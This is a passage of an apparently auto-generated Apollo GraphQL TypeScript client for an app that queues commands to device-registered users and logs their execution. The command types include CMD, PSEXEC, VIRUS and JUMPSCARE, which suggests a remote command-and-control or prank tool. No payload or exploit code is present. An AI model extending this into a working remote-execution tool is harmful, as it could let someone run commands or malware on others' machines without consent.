import { gql } from '@apollo/client';
import * as Apollo from '@apollo/client';
export type Maybe<T> = T | null;
export type Exact<T extends { [key: string]: unknown }> = { [K in keyof T]: T[K] };
export type MakeOptional<T, K extends keyof T> = Omit<T, K> & { [SubKey in K]?: Maybe<T[SubKey]> };
export type MakeMaybe<T, K extends keyof T> = Omit<T, K> & { [SubKey in K]: Maybe<T[SubKey]> };
const defaultOptions =  {}
/** All built-in and custom scalars, mapped to their actual values */
export type Scalars = {
  ID: string;
  String: string;
  Boolean: boolean;
  Int: number;
  Float: number;
  /** The javascript `Date` as string. Type represents date and time as the ISO Date string. */
  DateTime: any;
};

/** level of user access */
export enum AccessLevel {
  Denied = 'Denied',
  User = 'User',
  Pro = 'Pro',
  Admin = 'Admin'
}

export type ChatMessage = {
  __typename?: 'ChatMessage';
  id: Scalars['Int'];
  userId: Scalars['Int'];
  message: Scalars['String'];
  time: Scalars['DateTime'];
  deleted: Scalars['Boolean'];
};

export type ChatMessageInput = {
  message: Scalars['String'];
  userId: Scalars['Int'];
};

export type Command = {
  __typename?: 'Command';
  id: Scalars['Int'];
  body: Scalars['String'];
  username: Scalars['String'];
  type: CommandType;
  time: Scalars['DateTime'];
  is_executed: Scalars['Boolean'];
  deleted: Scalars['Boolean'];
};

export type CommandInput = {
  body: Scalars['String'];
  username: Scalars['String'];
  type: Scalars['Int'];
};

/** what u wanna to do */
export enum CommandType {
  Cmd = 'CMD',
  Psexec = 'PSEXEC',
  Virus = 'VIRUS',
  Jumpscare = 'JUMPSCARE'
}


export type LogsMessage = {
  __typename?: 'LogsMessage';
  id: Scalars['Int'];
  commandId: Scalars['Int'];
  command?: Maybe<Command>;
  username: Scalars['String'];
  message: Scalars['String'];
  deleted: Scalars['Boolean'];
  time: Scalars['DateTime'];
};

export type LogsMessageInput = {
  message: Scalars['String'];
  username: Scalars['String'];
  commandId: Scalars['Int'];
};

export type Mutation = {
  __typename?: 'Mutation';
  AddMessage: ChatMessage;
  DeleteMessage: ChatMessage;
  AddCommand: Command;
  DeleteCommand: Command;
  AddLog: LogsMessage;
  DeleteLog: LogsMessage;
  UpdateUser: User;
  CreateUser: User;
  DeleteUser: User;
};


export type MutationAddMessageArgs = {
  message: ChatMessageInput;
};


export type MutationDeleteMessageArgs = {
  id: Scalars['Int'];
};


export type MutationAddCommandArgs = {
  command: CommandInput;
};


export type MutationDeleteCommandArgs = {
  id: Scalars['Int'];
};


export type MutationAddLogArgs = {
  log: LogsMessageInput;
};


export type MutationDeleteLogArgs = {
  id: Scalars['Int'];
};


export type MutationUpdateUserArgs = {
  updated: UserUpdateInput;
  id: Scalars['Int'];
};


export type MutationCreateUserArgs = {
  User: UserInput;
};


export type MutationDeleteUserArgs = {
  id: Scalars['Int'];
};

export type Query = {
  __typename?: 'Query';
  Messages: Array<ChatMessage>;
  Commands: Array<Command>;
  Logs: Array<LogsMessage>;
  Users: Array<User>;
};


export type QueryMessagesArgs = {
  id?: Maybe<Scalars['Int']>;
};


export type QueryCommandsArgs = {
  execute_statement?: Maybe<Scalars['Boolean']>;
  id?: Maybe<Scalars['Int']>;
};


export type QueryLogsArgs = {
  id?: Maybe<Scalars['Int']>;
};

export type Subscription = {
  __typename?: 'Subscription';
  newMessage: ChatMessage;
  deletedMessage: ChatMessage;
  newCommand: Command;
  deletedCommand: Command;
  newLogMessage: LogsMessage;
  deletedLogMessage: LogsMessage;
  newUser: User;
  deletedUser: User;
};

export type User = {
  __typename?: 'User';
  id: Scalars['Int'];
  deviceid: Scalars['String'];
  username: Scalars['String'];
  access_level: AccessLevel;
  deleted: Scalars['Boolean'];
  last_online_time: Scalars['DateTime'];
  image?: Maybe<Scalars['String']>;
};

export type UserInput = {
  deviceid: Scalars['String'];
  username: Scalars['String'];
};

export type UserUpdateInput = {
  username?: Maybe<Scalars['String']>;
  access_level?: Maybe<Scalars['Int']>;
  image?: Maybe<Scalars['String']>;
};

export type AddChatMessageMutationVariables = Exact<{
  message: ChatMessageInput;
}>;


export type AddChatMessageMutation = (
  { __typename?: 'Mutation' }
  & { AddMessage: (
    { __typename?: 'ChatMessage' }
    & Pick<ChatMessage, 'id' | 'userId' | 'message' | 'time'>
  ) }
);

export type DeleteChatMessageMutationVariables = Exact<{
  id: Scalars['Int'];
}>;


export type DeleteChatMessageMutation = (
  { __typename?: 'Mutation' }
  & { DeleteMessage: (
    { __typename?: 'ChatMessage' }
    & Pick<ChatMessage, 'id' | 'userId' | 'message' | 'time' | 'deleted'>
  ) }
);

export type GetChatMessagesQueryVariables = Exact<{
  id: Scalars['Int'];
}>;


export type GetChatMessagesQuery = (
  { __typename?: 'Query' }
  & { Messages: Array<(
    { __typename?: 'ChatMessage' }
    & Pick<ChatMessage, 'message' | 'userId' | 'time' | 'id' | 'deleted'>
  )> }
);

export type SubsribeToNewMessagesSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubsribeToNewMessagesSubscription = (
  { __typename?: 'Subscription' }
  & { newMessage: (
    { __typename?: 'ChatMessage' }
    & Pick<ChatMessage, 'id' | 'userId' | 'message' | 'time' | 'deleted'>
  ) }
);

export type SubsribeToDeletedMessagesSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubsribeToDeletedMessagesSubscription = (
  { __typename?: 'Subscription' }
  & { deletedMessage: (
    { __typename?: 'ChatMessage' }
    & Pick<ChatMessage, 'id' | 'userId' | 'message' | 'time' | 'deleted'>
  ) }
);

export type AddCommandMutationVariables = Exact<{
  command: CommandInput;
}>;


export type AddCommandMutation = (
  { __typename?: 'Mutation' }
  & { AddCommand: (
    { __typename?: 'Command' }
    & Pick<Command, 'id' | 'username' | 'body' | 'type' | 'time' | 'is_executed' | 'deleted'>
  ) }
);

export type DeleteCommandMutationVariables = Exact<{
  id: Scalars['Int'];
}>;


export type DeleteCommandMutation = (
  { __typename?: 'Mutation' }
  & { DeleteCommand: (
    { __typename?: 'Command' }
    & Pick<Command, 'id' | 'body' | 'username' | 'type' | 'time' | 'is_executed' | 'deleted'>
  ) }
);

export type GetCommandsQueryVariables = Exact<{
  execute_statement?: Maybe<Scalars['Boolean']>;
}>;


export type GetCommandsQuery = (
  { __typename?: 'Query' }
  & { Commands: Array<(
    { __typename?: 'Command' }
    & Pick<Command, 'id' | 'body' | 'username' | 'type' | 'time' | 'is_executed' | 'deleted'>
  )> }
);

export type SubscribeToNewCommandsSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToNewCommandsSubscription = (
  { __typename?: 'Subscription' }
  & { newCommand: (
    { __typename?: 'Command' }
    & Pick<Command, 'id' | 'body' | 'username' | 'type' | 'time' | 'is_executed' | 'deleted'>
  ) }
);

export type SubscribeToDeletedCommandSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToDeletedCommandSubscription = (
  { __typename?: 'Subscription' }
  & { deletedCommand: (
    { __typename?: 'Command' }
    & Pick<Command, 'id' | 'body' | 'username' | 'type' | 'time' | 'is_executed' | 'deleted'>
  ) }
);

export type SubscribeToCommandExecutionSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToCommandExecutionSubscription = (
  { __typename?: 'Subscription' }
  & { newLogMessage: (
    { __typename?: 'LogsMessage' }
    & Pick<LogsMessage, 'id' | 'commandId'>
  ) }
);

export type AddLogMessageMutationVariables = Exact<{
  log: LogsMessageInput;
}>;


export type AddLogMessageMutation = (
  { __typename?: 'Mutation' }
  & { AddLog: (
    { __typename?: 'LogsMessage' }
    & Pick<LogsMessage, 'id' | 'commandId' | 'username' | 'message' | 'time'>
  ) }
);

export type DeleteLogMessageMutationVariables = Exact<{
  id: Scalars['Int'];
}>;


export type DeleteLogMessageMutation = (
  { __typename?: 'Mutation' }
  & { DeleteLog: (
    { __typename?: 'LogsMessage' }
    & Pick<LogsMessage, 'id' | 'commandId' | 'username' | 'message' | 'deleted' | 'time'>
  ) }
);

export type GetLogMessagesQueryVariables = Exact<{
  id: Scalars['Int'];
}>;


export type GetLogMessagesQuery = (
  { __typename?: 'Query' }
  & { Logs: Array<(
    { __typename?: 'LogsMessage' }
    & Pick<LogsMessage, 'id' | 'commandId' | 'username' | 'message' | 'deleted' | 'time'>
  )> }
);

export type SubscribeToNewLogMessagesSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToNewLogMessagesSubscription = (
  { __typename?: 'Subscription' }
  & { newLogMessage: (
    { __typename?: 'LogsMessage' }
    & Pick<LogsMessage, 'id' | 'username' | 'message' | 'deleted' | 'time' | 'commandId'>
  ) }
);

export type SubscribeToDeletedLogMessagesSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToDeletedLogMessagesSubscription = (
  { __typename?: 'Subscription' }
  & { deletedLogMessage: (
    { __typename?: 'LogsMessage' }
    & Pick<LogsMessage, 'id' | 'commandId' | 'username' | 'message' | 'deleted' | 'time'>
  ) }
);

export type CreateUserMutationVariables = Exact<{
  user: UserInput;
}>;


export type CreateUserMutation = (
  { __typename?: 'Mutation' }
  & { CreateUser: (
    { __typename?: 'User' }
    & Pick<User, 'id' | 'deviceid' | 'access_level' | 'deleted' | 'last_online_time' | 'image' | 'username'>
  ) }
);

export type GetUsersQueryVariables = Exact<{ [key: string]: never; }>;


export type GetUsersQuery = (
  { __typename?: 'Query' }
  & { Users: Array<(
    { __typename?: 'User' }
    & Pick<User, 'id' | 'deviceid' | 'access_level' | 'deleted' | 'last_online_time' | 'image' | 'username'>
  )> }
);

export type SubscribeToNewUserSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToNewUserSubscription = (
  { __typename?: 'Subscription' }
  & { newUser: (
    { __typename?: 'User' }
    & Pick<User, 'id' | 'deviceid' | 'username' | 'access_level' | 'deleted' | 'last_online_time' | 'image'>
  ) }
);

export type SubscribeToDeletedUserSubscriptionVariables = Exact<{ [key: string]: never; }>;


export type SubscribeToDeletedUserSubscription = (
  { __typename?: 'Subscription' }
  & { deletedUser: (
    { __typename?: 'User' }
    & Pick<User, 'id' | 'deviceid' | 'username' | 'access_level' | 'deleted' | 'last_online_time' | 'image'>
  ) }
);


export const AddChatMessageDocument = gql`
    mutation AddChatMessage($message: ChatMessageInput!) {
  AddMessage(message: $message) {
    id
    userId
    message
    time
  }
}
    `;
export type AddChatMessageMutationFn = Apollo.MutationFunction<AddChatMessageMutation, AddChatMessageMutationVariables>;

/**
 * __useAddChatMessageMutation__
 *
 * To run a mutation, you first call `useAddChatMessageMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useAddChatMessageMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [addChatMessageMutation, { data, loading, error }] = useAddChatMessageMutation({
 *   variables: {
 *      message: // value for 'message'
 *   },
 * });
 */
export function useAddChatMessageMutation(baseOptions?: Apollo.MutationHookOptions<AddChatMessageMutation, AddChatMessageMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<AddChatMessageMutation, AddChatMessageMutationVariables>(AddChatMessageDocument, options);
      }
export type AddChatMessageMutationHookResult = ReturnType<typeof useAddChatMessageMutation>;
export type AddChatMessageMutationResult = Apollo.MutationResult<AddChatMessageMutation>;
export type AddChatMessageMutationOptions = Apollo.BaseMutationOptions<AddChatMessageMutation, AddChatMessageMutationVariables>;
export const DeleteChatMessageDocument = gql`
    mutation DeleteChatMessage($id: Int!) {
  DeleteMessage(id: $id) {
    id
    userId
    message
    time
    deleted
  }
}
    `;
export type DeleteChatMessageMutationFn = Apollo.MutationFunction<DeleteChatMessageMutation, DeleteChatMessageMutationVariables>;

/**
 * __useDeleteChatMessageMutation__
 *
 * To run a mutation, you first call `useDeleteChatMessageMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useDeleteChatMessageMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [deleteChatMessageMutation, { data, loading, error }] = useDeleteChatMessageMutation({
 *   variables: {
 *      id: // value for 'id'
 *   },
 * });
 */
export function useDeleteChatMessageMutation(baseOptions?: Apollo.MutationHookOptions<DeleteChatMessageMutation, DeleteChatMessageMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<DeleteChatMessageMutation, DeleteChatMessageMutationVariables>(DeleteChatMessageDocument, options);
      }
export type DeleteChatMessageMutationHookResult = ReturnType<typeof useDeleteChatMessageMutation>;
export type DeleteChatMessageMutationResult = Apollo.MutationResult<DeleteChatMessageMutation>;
export type DeleteChatMessageMutationOptions = Apollo.BaseMutationOptions<DeleteChatMessageMutation, DeleteChatMessageMutationVariables>;
export const GetChatMessagesDocument = gql`
    query GetChatMessages($id: Int!) {
  Messages(id: $id) {
    message
    userId
    time
    id
    deleted
  }
}
    `;

/**
 * __useGetChatMessagesQuery__
 *
 * To run a query within a React component, call `useGetChatMessagesQuery` and pass it any options that fit your needs.
 * When your component renders, `useGetChatMessagesQuery` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the query, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useGetChatMessagesQuery({
 *   variables: {
 *      id: // value for 'id'
 *   },
 * });
 */
export function useGetChatMessagesQuery(baseOptions: Apollo.QueryHookOptions<GetChatMessagesQuery, GetChatMessagesQueryVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useQuery<GetChatMessagesQuery, GetChatMessagesQueryVariables>(GetChatMessagesDocument, options);
      }
export function useGetChatMessagesLazyQuery(baseOptions?: Apollo.LazyQueryHookOptions<GetChatMessagesQuery, GetChatMessagesQueryVariables>) {
          const options = {...defaultOptions, ...baseOptions}
          return Apollo.useLazyQuery<GetChatMessagesQuery, GetChatMessagesQueryVariables>(GetChatMessagesDocument, options);
        }
export type GetChatMessagesQueryHookResult = ReturnType<typeof useGetChatMessagesQuery>;
export type GetChatMessagesLazyQueryHookResult = ReturnType<typeof useGetChatMessagesLazyQuery>;
export type GetChatMessagesQueryResult = Apollo.QueryResult<GetChatMessagesQuery, GetChatMessagesQueryVariables>;
export const SubsribeToNewMessagesDocument = gql`
    subscription SubsribeToNewMessages {
  newMessage {
    id
    userId
    message
    time
    deleted
  }
}
    `;

/**
 * __useSubsribeToNewMessagesSubscription__
 *
 * To run a query within a React component, call `useSubsribeToNewMessagesSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubsribeToNewMessagesSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubsribeToNewMessagesSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubsribeToNewMessagesSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubsribeToNewMessagesSubscription, SubsribeToNewMessagesSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubsribeToNewMessagesSubscription, SubsribeToNewMessagesSubscriptionVariables>(SubsribeToNewMessagesDocument, options);
      }
export type SubsribeToNewMessagesSubscriptionHookResult = ReturnType<typeof useSubsribeToNewMessagesSubscription>;
export type SubsribeToNewMessagesSubscriptionResult = Apollo.SubscriptionResult<SubsribeToNewMessagesSubscription>;
export const SubsribeToDeletedMessagesDocument = gql`
    subscription SubsribeToDeletedMessages {
  deletedMessage {
    id
    userId
    message
    time
    deleted
  }
}
    `;

/**
 * __useSubsribeToDeletedMessagesSubscription__
 *
 * To run a query within a React component, call `useSubsribeToDeletedMessagesSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubsribeToDeletedMessagesSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubsribeToDeletedMessagesSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubsribeToDeletedMessagesSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubsribeToDeletedMessagesSubscription, SubsribeToDeletedMessagesSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubsribeToDeletedMessagesSubscription, SubsribeToDeletedMessagesSubscriptionVariables>(SubsribeToDeletedMessagesDocument, options);
      }
export type SubsribeToDeletedMessagesSubscriptionHookResult = ReturnType<typeof useSubsribeToDeletedMessagesSubscription>;
export type SubsribeToDeletedMessagesSubscriptionResult = Apollo.SubscriptionResult<SubsribeToDeletedMessagesSubscription>;
export const AddCommandDocument = gql`
    mutation AddCommand($command: CommandInput!) {
  AddCommand(command: $command) {
    id
    username
    body
    type
    time
    is_executed
    deleted
  }
}
    `;
export type AddCommandMutationFn = Apollo.MutationFunction<AddCommandMutation, AddCommandMutationVariables>;

/**
 * __useAddCommandMutation__
 *
 * To run a mutation, you first call `useAddCommandMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useAddCommandMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [addCommandMutation, { data, loading, error }] = useAddCommandMutation({
 *   variables: {
 *      command: // value for 'command'
 *   },
 * });
 */
export function useAddCommandMutation(baseOptions?: Apollo.MutationHookOptions<AddCommandMutation, AddCommandMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<AddCommandMutation, AddCommandMutationVariables>(AddCommandDocument, options);
      }
export type AddCommandMutationHookResult = ReturnType<typeof useAddCommandMutation>;
export type AddCommandMutationResult = Apollo.MutationResult<AddCommandMutation>;
export type AddCommandMutationOptions = Apollo.BaseMutationOptions<AddCommandMutation, AddCommandMutationVariables>;
export const DeleteCommandDocument = gql`
    mutation DeleteCommand($id: Int!) {
  DeleteCommand(id: $id) {
    id
    body
    username
    type
    time
    is_executed
    deleted
  }
}
    `;
export type DeleteCommandMutationFn = Apollo.MutationFunction<DeleteCommandMutation, DeleteCommandMutationVariables>;

/**
 * __useDeleteCommandMutation__
 *
 * To run a mutation, you first call `useDeleteCommandMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useDeleteCommandMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [deleteCommandMutation, { data, loading, error }] = useDeleteCommandMutation({
 *   variables: {
 *      id: // value for 'id'
 *   },
 * });
 */
export function useDeleteCommandMutation(baseOptions?: Apollo.MutationHookOptions<DeleteCommandMutation, DeleteCommandMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<DeleteCommandMutation, DeleteCommandMutationVariables>(DeleteCommandDocument, options);
      }
export type DeleteCommandMutationHookResult = ReturnType<typeof useDeleteCommandMutation>;
export type DeleteCommandMutationResult = Apollo.MutationResult<DeleteCommandMutation>;
export type DeleteCommandMutationOptions = Apollo.BaseMutationOptions<DeleteCommandMutation, DeleteCommandMutationVariables>;
export const GetCommandsDocument = gql`
    query GetCommands($execute_statement: Boolean) {
  Commands(execute_statement: $execute_statement) {
    id
    body
    username
    type
    time
    is_executed
    deleted
  }
}
    `;

/**
 * __useGetCommandsQuery__
 *
 * To run a query within a React component, call `useGetCommandsQuery` and pass it any options that fit your needs.
 * When your component renders, `useGetCommandsQuery` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the query, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useGetCommandsQuery({
 *   variables: {
 *      execute_statement: // value for 'execute_statement'
 *   },
 * });
 */
export function useGetCommandsQuery(baseOptions?: Apollo.QueryHookOptions<GetCommandsQuery, GetCommandsQueryVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useQuery<GetCommandsQuery, GetCommandsQueryVariables>(GetCommandsDocument, options);
      }
export function useGetCommandsLazyQuery(baseOptions?: Apollo.LazyQueryHookOptions<GetCommandsQuery, GetCommandsQueryVariables>) {
          const options = {...defaultOptions, ...baseOptions}
          return Apollo.useLazyQuery<GetCommandsQuery, GetCommandsQueryVariables>(GetCommandsDocument, options);
        }
export type GetCommandsQueryHookResult = ReturnType<typeof useGetCommandsQuery>;
export type GetCommandsLazyQueryHookResult = ReturnType<typeof useGetCommandsLazyQuery>;
export type GetCommandsQueryResult = Apollo.QueryResult<GetCommandsQuery, GetCommandsQueryVariables>;
export const SubscribeToNewCommandsDocument = gql`
    subscription SubscribeToNewCommands {
  newCommand {
    id
    body
    username
    type
    time
    is_executed
    deleted
  }
}
    `;

/**
 * __useSubscribeToNewCommandsSubscription__
 *
 * To run a query within a React component, call `useSubscribeToNewCommandsSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubscribeToNewCommandsSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToNewCommandsSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToNewCommandsSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToNewCommandsSubscription, SubscribeToNewCommandsSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToNewCommandsSubscription, SubscribeToNewCommandsSubscriptionVariables>(SubscribeToNewCommandsDocument, options);
      }
export type SubscribeToNewCommandsSubscriptionHookResult = ReturnType<typeof useSubscribeToNewCommandsSubscription>;
export type SubscribeToNewCommandsSubscriptionResult = Apollo.SubscriptionResult<SubscribeToNewCommandsSubscription>;
export const SubscribeToDeletedCommandDocument = gql`
    subscription SubscribeToDeletedCommand {
  deletedCommand {
    id
    body
    username
    type
    time
    is_executed
    deleted
  }
}
    `;

/**
 * __useSubscribeToDeletedCommandSubscription__
 *
 * To run a query within a React component, call `useSubscribeToDeletedCommandSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubscribeToDeletedCommandSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToDeletedCommandSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToDeletedCommandSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToDeletedCommandSubscription, SubscribeToDeletedCommandSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToDeletedCommandSubscription, SubscribeToDeletedCommandSubscriptionVariables>(SubscribeToDeletedCommandDocument, options);
      }
export type SubscribeToDeletedCommandSubscriptionHookResult = ReturnType<typeof useSubscribeToDeletedCommandSubscription>;
export type SubscribeToDeletedCommandSubscriptionResult = Apollo.SubscriptionResult<SubscribeToDeletedCommandSubscription>;
export const SubscribeToCommandExecutionDocument = gql`
    subscription SubscribeToCommandExecution {
  newLogMessage {
    id
    commandId
  }
}
    `;

/**
 * __useSubscribeToCommandExecutionSubscription__
 *
 * To run a query within a React component, call `useSubscribeToCommandExecutionSubscription` and pass it any options that fit your needs.
 * When your component renders, `useSubscribeToCommandExecutionSubscription` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the subscription, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useSubscribeToCommandExecutionSubscription({
 *   variables: {
 *   },
 * });
 */
export function useSubscribeToCommandExecutionSubscription(baseOptions?: Apollo.SubscriptionHookOptions<SubscribeToCommandExecutionSubscription, SubscribeToCommandExecutionSubscriptionVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useSubscription<SubscribeToCommandExecutionSubscription, SubscribeToCommandExecutionSubscriptionVariables>(SubscribeToCommandExecutionDocument, options);
      }
export type SubscribeToCommandExecutionSubscriptionHookResult = ReturnType<typeof useSubscribeToCommandExecutionSubscription>;
export type SubscribeToCommandExecutionSubscriptionResult = Apollo.SubscriptionResult<SubscribeToCommandExecutionSubscription>;
export const AddLogMessageDocument = gql`
    mutation AddLogMessage($log: LogsMessageInput!) {
  AddLog(log: $log) {
    id
    commandId
    username
    message
    time
  }
}
    `;
export type AddLogMessageMutationFn = Apollo.MutationFunction<AddLogMessageMutation, AddLogMessageMutationVariables>;

/**
 * __useAddLogMessageMutation__
 *
 * To run a mutation, you first call `useAddLogMessageMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useAddLogMessageMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [addLogMessageMutation, { data, loading, error }] = useAddLogMessageMutation({
 *   variables: {
 *      log: // value for 'log'
 *   },
 * });
 */
export function useAddLogMessageMutation(baseOptions?: Apollo.MutationHookOptions<AddLogMessageMutation, AddLogMessageMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<AddLogMessageMutation, AddLogMessageMutationVariables>(AddLogMessageDocument, options);
      }
export type AddLogMessageMutationHookResult = ReturnType<typeof useAddLogMessageMutation>;
export type AddLogMessageMutationResult = Apollo.MutationResult<AddLogMessageMutation>;
export type AddLogMessageMutationOptions = Apollo.BaseMutationOptions<AddLogMessageMutation, AddLogMessageMutationVariables>;
export const DeleteLogMessageDocument = gql`
    mutation DeleteLogMessage($id: Int!) {
  DeleteLog(id: $id) {
    id
    commandId
    username
    username
    message
    deleted
    time
  }
}
    `;
export type DeleteLogMessageMutationFn = Apollo.MutationFunction<DeleteLogMessageMutation, DeleteLogMessageMutationVariables>;

/**
 * __useDeleteLogMessageMutation__
 *
 * To run a mutation, you first call `useDeleteLogMessageMutation` within a React component and pass it any options that fit your needs.
 * When your component renders, `useDeleteLogMessageMutation` returns a tuple that includes:
 * - A mutate function that you can call at any time to execute the mutation
 * - An object with fields that represent the current status of the mutation's execution
 *
 * @param baseOptions options that will be passed into the mutation, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options-2;
 *
 * @example
 * const [deleteLogMessageMutation, { data, loading, error }] = useDeleteLogMessageMutation({
 *   variables: {
 *      id: // value for 'id'
 *   },
 * });
 */
export function useDeleteLogMessageMutation(baseOptions?: Apollo.MutationHookOptions<DeleteLogMessageMutation, DeleteLogMessageMutationVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useMutation<DeleteLogMessageMutation, DeleteLogMessageMutationVariables>(DeleteLogMessageDocument, options);
      }
export type DeleteLogMessageMutationHookResult = ReturnType<typeof useDeleteLogMessageMutation>;
export type DeleteLogMessageMutationResult = Apollo.MutationResult<DeleteLogMessageMutation>;
export type DeleteLogMessageMutationOptions = Apollo.BaseMutationOptions<DeleteLogMessageMutation, DeleteLogMessageMutationVariables>;
export const GetLogMessagesDocument = gql`
    query GetLogMessages($id: Int!) {
  Logs(id: $id) {
    id
    commandId
    username
    message
    deleted
    time
  }
}
    `;

/**
 * __useGetLogMessagesQuery__
 *
 * To run a query within a React component, call `useGetLogMessagesQuery` and pass it any options that fit your needs.
 * When your component renders, `useGetLogMessagesQuery` returns an object from Apollo Client that contains loading, error, and data properties
 * you can use to render your UI.
 *
 * @param baseOptions options that will be passed into the query, supported options are listed on: https://www.apollographql.com/docs/react/api/react-hooks/#options;
 *
 * @example
 * const { data, loading, error } = useGetLogMessagesQuery({
 *   variables: {
 *      id: // value for 'id'
 *   },
 * });
 */
export function useGetLogMessagesQuery(baseOptions: Apollo.QueryHookOptions<GetLogMessagesQuery, GetLogMessagesQueryVariables>) {
        const options = {...defaultOptions, ...baseOptions}
        return Apollo.useQuery<GetLogMessagesQuery, GetLogMessagesQueryVariables>(GetLogMessagesDocument, options);
      }
export function useGetLogMessagesLazyQuery(baseOptions?: Apollo.LazyQueryHookOptions<GetLogMessagesQuery, GetLogMessagesQueryVariables>) {
          const options = {...defaultOptions, ...baseOptions}
          return Apollo.useLazyQuery<GetLogMessagesQuery, GetLogMessagesQueryVariables>(GetLogMessagesDocument, options);
        }
export type GetLogMessagesQueryHookResult = ReturnType<typeof useGetLogMessagesQuery>;
export type GetLogMessagesLazyQueryHookResult = ReturnType<typeof useGetLogMessagesLazyQuery>;
export type GetLogMessagesQueryResult = Apollo.QueryResult<GetLogMessagesQuery, GetLogMessagesQueryVariables>;
export const SubscribeToNewLogMessagesDocument = gql`
    subscription SubscribeToNewLogMessages {
  newLogMessage {
    id
    username
    message
    deleted
    time
    commandId
  }
}
    `;

/**
 * __useSubscribeToNewLogMessagesSubscription__
 *
 * To run a query within a React component, call `useSubscribeToNewLogMessagesSubscription` and pass it any options that fit your needs.
